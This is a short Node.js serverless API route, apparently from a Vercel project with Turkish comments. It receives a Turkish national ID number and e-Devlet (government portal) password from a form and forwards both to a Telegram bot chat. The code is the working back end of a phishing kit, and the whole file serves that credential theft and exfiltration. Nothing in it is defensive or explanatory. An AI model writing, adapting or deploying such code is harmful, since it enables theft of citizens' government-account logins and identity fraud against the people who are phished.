// api/send-data.js

const axios = require('axios');

// Vercel ortam değişkenlerinden BOT_TOKEN ve CHAT_ID'yi okur
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

module.exports = async (req, res) => {
    // Sadece POST isteklerini işle
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    if (!BOT_TOKEN || !CHAT_ID) {
        // Güvenlik: Ortam değişkenleri yoksa 500 hatası döndür
        return res.status(500).json({ message: 'Server configuration error.' });
    }

    try {
        const { tc_no, password } = req.body;

        if (!tc_no || !password) {
            return res.status(400).json({ message: 'T.C. Kimlik No ve şifre zorunludur.' });
        }

        // Telegram'a gönderilecek mesaj
        const messageText = `
*--- 🇹🇷 e-Devlet Giriş Bilgileri ---*
*T.C. Kimlik No:* \`${tc_no}\`
*e-Devlet Şifresi:* \`${password}\`
`;
        
        const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        // Telegram'a mesajı gönderme isteği
        await axios.post(telegramApiUrl, {
            chat_id: CHAT_ID,
            text: messageText,
            parse_mode: 'Markdown', // Mesajı daha okunaklı hale getirir
        });

        // Başarılı yanıt
        return res.status(200).json({ message: 'Veriler başarıyla iletildi.' });

    } catch (error) {
        console.error('Telegram Hatası:', error.message);
        // Genel bir hata mesajı döndür
        return res.status(500).json({ 
            message: 'Bilgiler iletilemedi, lütfen tekrar deneyin.',
        });
    }
};